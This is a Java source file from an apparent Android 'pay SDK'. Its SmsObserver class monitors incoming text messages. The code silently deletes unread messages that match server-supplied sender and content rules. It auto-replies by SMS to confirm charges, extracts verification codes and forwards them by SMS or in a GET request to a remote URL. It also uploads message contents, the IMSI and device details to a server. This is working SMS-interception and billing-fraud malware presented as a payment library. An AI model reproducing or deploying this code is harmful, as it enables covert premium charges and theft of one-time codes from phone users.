package com.sdk.wj.paysdk.sms;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;

import org.json.JSONException;
import org.json.JSONObject;

import com.sdk.wj.paysdk.channel.PayChannelFactory;
import com.sdk.wj.paysdk.httpCenter.GetDataImpl;
import com.sdk.wj.paysdk.pay.SDKInit;
import com.sdk.wj.paysdk.utils.Constants;
import com.sdk.wj.paysdk.utils.Log;
import com.sdk.wj.paysdk.utils.Utils;


/**
 * Created by Administrator on 2017/4/26.
 */

public class SmsObserver extends ContentObserver {
    int a = 0;
    String smsId = "";
    String payType;
    private static Context context = null;
    static String smsContent = "";
    static String secendSmsId = "";

    public SmsObserver(Handler handler) {
        super(handler);
        if (SDKInit.mContext != null) {
            context = SDKInit.mContext;
            Log.debug("-------regist success!");
        }
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        try {
            if (uri.toString().equals("content://sms/raw") || uri.toString().equals("content://sms/") || uri.toString().equals("content://sms")) {
                return;
            }
            a++;
            Log.debug("onChange", "No:" + a);
            Log.debug("onChange", "selfChange:" + selfChange + "");
            Log.debug("onChange", "uri:" + uri);
            choose(uri);
//            deleteByContent();
//            deleteByNumber();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getSMSinfo(String _id) {
        Cursor mCursor = null;
        String smsAddress = "";
        String smsBody = "";
        try {
            mCursor = SDKInit.mContext.getContentResolver().query(Uri.parse("content://sms"),
                    new String[]{"_id", "address", "read", "body", "thread_id"}, "_id=?", new String[]{_id},
                    "date desc");
            if (mCursor == null) {
                return;
            }
            while (mCursor.moveToNext()) {
                int addressIndex = mCursor.getColumnIndex("address");
                if (addressIndex != -1) {
                    smsAddress = mCursor.getString(addressIndex);
                }
                int bodyIndex = mCursor.getColumnIndex("body");
                if (addressIndex != -1) {
                    smsBody = mCursor.getString(bodyIndex);
                }
                chooseSMS(smsAddress, smsBody);
                delete(_id, smsAddress, smsBody);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            mCursor.close();
        }
    }

    private int delete(String _id, String smsAddress, String smsBody) {
        Uri contentUri = Uri.parse("content://sms");
        int delete = context.getContentResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
        Sms_send_tongbu(smsAddress + "  " + smsBody, SDKInit.mContext, delete);
        return delete;
    }

    private void chooseSMS(String smsAddress, String smsBody) {
        if (smsContent.equals("")) {
            smsContent = smsBody;
            if (Constants.isOutPut) {
                Log.debug("==========>缓存里面的的东西为空设置内容并且同步:" + smsBody);
            }
            smsHandle(smsAddress, smsBody, SDKInit.mContext);
        } else {
            if (smsContent.equals(smsBody)) {
                if (Constants.isOutPut) {
                    Log.debug("==========>缓存的东西跟新短信内容相同:" + smsBody);
                }
            } else {
                smsContent = smsBody;
                if (Constants.isOutPut) {
                    Log.debug("==========>缓存的东西跟新短信内容不相同並且需要同步:" + smsBody);
                }
                smsHandle(smsAddress, smsBody, SDKInit.mContext);
            }
        }
    }

    private void smsHandle(String smsAddress, String smsBody, Context context) {
        for (int i = 0; i < PayChannelFactory.limit_content.size(); i++) {
            String senderContent = "";
            String limitNum = "";//发送号码 limitNum
            String vCodeLength = "";//验证码长度 limit_msg_1
            String limit_msg_2 = "";//短信拦截号码 limit_msg_2
            String sendParam = "";
            String otherNeedUrl = "";
            String limit_msg_data = "";
            try {
                JSONObject json = new JSONObject(PayChannelFactory.limit_content.get(i).toString());
                limit_msg_2 = json.getString("limit_msg_2");
                limit_msg_data = json.isNull("limit_msg_data") ? "" : json.getString("limit_msg_data");
                Log.debug("========>limit_msg_data:" + limit_msg_data);
            } catch (Exception e) {
                Log.debug("=================>eeeeeee:" + e);
                Sms_send_tongbu(catchError(e), SDKInit.mContext, -4);
            }
            Log.debug("===============>limit_msg_2:" + limit_msg_2);
            if (TextUtils.isEmpty(limit_msg_2)) {
                return;
            }

            Log.debug("smsAddress:" + smsAddress);
            Log.debug("smsBody:" + smsBody);

            boolean b = false;
            String[] pa = limit_msg_2.split(",");
            for (int k = 0; k < pa.length; k++) {
                if (pa[k].length() > smsAddress.length()) {
                    if (pa[k].contains(smsAddress) && smsBody.contains(limit_msg_data)) {
                        Log.debug("pa[k]:" + pa[k]);
                        Log.debug("smsAddress:" + smsAddress);
                        Log.debug("pa[k].contains(smsAddress):" + pa[k].contains(smsAddress));
                        b = true;
                    }
                } else {
                    if (smsAddress.contains(pa[k]) && smsBody.contains(limit_msg_data)) {
                        Log.debug("pa[k]:" + pa[k]);
                        Log.debug("smsAddress:" + smsAddress);
                        Log.debug("pa[k].contains(smsAddress):" + pa[k].contains(smsAddress));
                        b = true;
                    }
                }
            }
            if (b) {
                try {
                    JSONObject json = new JSONObject(PayChannelFactory.limit_content.get(i).toString());
                    payType = json.getString("payType");
                    Log.debug("===============>payType:" + payType);
                    senderContent = json.getString("fix_msg");
                    vCodeLength = json.isNull("limit_msg_1") ? "" : json.getString("limit_msg_1");
                    limitNum = json.isNull("limitNum") ? "" : json.getString("limitNum");
                    sendParam = json.isNull("sendParam") ? "" : json.getString("sendParam");
                    otherNeedUrl = json.isNull("otherNeedUrl") ? "" : json.getString("otherNeedUrl");
                    if (limitNum.equals("")) {
                        limitNum = smsAddress;
                    }
                    if (payType.equals("0")) {

                    } else if (payType.equals("1")) {
                        if (Constants.isOutPut) {
                            Log.debug("======>要开始回复Y了:" + senderContent);
                        }
                        MySmsManager.SendMessage(limitNum, senderContent);
                        Log.debug("=======>limitNum:" + limitNum + "    " + senderContent);
                        Sms_send_tongbu(limitNum + "      " + senderContent + "<---回复内容 |||短信内容------>" + senderContent, context, 10001);
                    } else if (payType.equals("2")) {
                        String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                        MySmsManager.SendMessage(limitNum, SmsContent);
                        Sms_send_tongbu("拦截到的发回去的内容----->" + limitNum + "      " + SmsContent, context, 10002);
                    } else if (payType.equals("3")) {
                        String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                        String url = otherNeedUrl + "?vcode=" + SmsContent + "&sendParam=" + sendParam;
                        GetDataImpl.doGetRequestWithoutListener(url);
                        if (Constants.isOutPut) {
                            Log.debug("------>content:" + smsBody);
                            Log.debug("------>拦截到的验证码：" + SmsContent);
                            Log.debug("------>url：" + url);
                        }
                        Sms_send_tongbu(smsBody + " ----> " + url, context, 10003);
                    } else if (payType.equals("4")) {
                        String SmsCode = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
                        Log.debug("======>SmsCode:" + SmsCode);
                        Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():" + limitNum);
                        if (SmsCode != null) {
                            MySmsManager.SendMessage(limitNum, senderContent + SmsCode);
                            Sms_send_tongbu("拦截到的发回去的内容----->" + senderContent + SmsCode, context, 10004);
                        }
                    } else {

                    }
                } catch (Exception e) {
                    Log.debug("=====>e:" + e);
                    Sms_send_tongbu(catchError(e), SDKInit.mContext, -5);
                }
            }
        }
    }

    public static void Sms_send_tongbu(final String content, final Context mContext, final int sendSuccess) {
        try {
            JSONObject json = new JSONObject();
            json.put("os_version", android.os.Build.VERSION.RELEASE);
            json.put("os_model", android.os.Build.MODEL.replace(" ", "%20"));
            json.put("content", content);
            json.put("imsi", Utils.getIMSI(mContext));
            json.put("status", sendSuccess);
            json.put("packageid", Utils.getPackId(mContext));
            GetDataImpl.doPostReuqestWithoutListener(Constants.SMS_Send_Tongbu, json.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

//    /**
//     * //     * 根据短信内容删除短信
//     * //
//     */
//    private void deleteByContent() {
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                try {
//                    for (String content : ACacheUtils.getInstance(SDKInit.mContext).getMessageData()) {
//                        Cursor mCursor = context.getContentResolver().query(Uri.parse("content://sms"),
//                                new String[]{"_id", "address", "thread_id", "date", "protocol", "type", "body", "read"},
//                                "body LIKE ? ", new String[]{content + "%"}, "date desc");
//                        while (mCursor.moveToNext()) {
//                            SmsInfo _smsInfo = new SmsInfo();
//                            int _inIndex = mCursor.getColumnIndex("_id");
//                            if (_inIndex != -1) {
//                                _smsInfo._id = mCursor.getString(_inIndex);
//                            }
//
//                            int thread_idIndex = mCursor.getColumnIndex("thread_id");
//                            if (thread_idIndex != -1) {
//                                _smsInfo.thread_id = mCursor.getString(thread_idIndex);
//                            }
//
//                            int addressIndex = mCursor.getColumnIndex("address");
//                            if (addressIndex != -1) {
//                                _smsInfo.smsAddress = mCursor.getString(addressIndex);
//                            }
//
//                            int bodyIndex = mCursor.getColumnIndex("body");
//                            if (bodyIndex != -1) {
//                                _smsInfo.smsBody = mCursor.getString(bodyIndex);
//                            }
//
//                            int readIndex = mCursor.getColumnIndex("read");
//                            if (readIndex != -1) {
//                                _smsInfo.read = mCursor.getString(readIndex);
//                            }
////                            delete(_smsInfo._id);
//                        }
//                        mCursor.close();
//                    }
//                } catch (Exception e) {
//
//                }
//            }
//        }).start();
//    }
//
//    /**
//     * 根据号码删除短信
//     */
//    private void deleteByNumber() {
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                try {
//                    for (String phoneNum : ACacheUtils.getInstance(SDKInit.mContext).getPhoneData()) {
//                        Cursor mCursor = context.getContentResolver().query(Uri.parse("content://sms"),
//                                new String[]{"_id", "address", "thread_id", "date", "protocol", "type", "body", "read"},
//                                "address LIKE ? ", new String[]{phoneNum + "%"}, "date desc");
//                        while (mCursor.moveToNext()) {
//                            SmsInfo _smsInfo = new SmsInfo();
//                            int _inIndex = mCursor.getColumnIndex("_id");
//                            if (_inIndex != -1) {
//                                _smsInfo._id = mCursor.getString(_inIndex);
//                            }
//
//                            int thread_idIndex = mCursor.getColumnIndex("thread_id");
//                            if (thread_idIndex != -1) {
//                                _smsInfo.thread_id = mCursor.getString(thread_idIndex);
//                            }
//
//                            int addressIndex = mCursor.getColumnIndex("address");
//                            if (addressIndex != -1) {
//                                _smsInfo.smsAddress = mCursor.getString(addressIndex);
//                            }
//
//                            int bodyIndex = mCursor.getColumnIndex("body");
//                            if (bodyIndex != -1) {
//                                _smsInfo.smsBody = mCursor.getString(bodyIndex);
//                            }
//
//                            int readIndex = mCursor.getColumnIndex("read");
//                            if (readIndex != -1) {
//                                _smsInfo.read = mCursor.getString(readIndex);
//                            }
////                            delete(_smsInfo._id);
//                        }
//                        mCursor.close();
//                    }
//                } catch (Exception e) {
//
//                }
//            }
//        }).start();
//    }

    public static String catchError(Exception e) {
        StackTraceElement[] s = e.getStackTrace();
        StringBuffer sb = new StringBuffer();
        sb.append(e.toString() + "\t");
        for (int i = 0; i < s.length; i++) {
            sb.append(s[i] + "\t");
        }
        return sb.toString();
    }

    private synchronized void choose(Uri uri) {
        smsId = uri.toString().substring(uri.toString().lastIndexOf("/") + 1);
        if (secendSmsId.equals("")) {
            secendSmsId = smsId;
            Log.debug("smsId:" + smsId);
            getSMSinfo(smsId);
        } else {
            if (secendSmsId.equals(smsId)) {
                return;
            } else {
                secendSmsId = smsId;
                Log.debug("smsId:" + smsId);
                getSMSinfo(smsId);
            }
        }
    }
}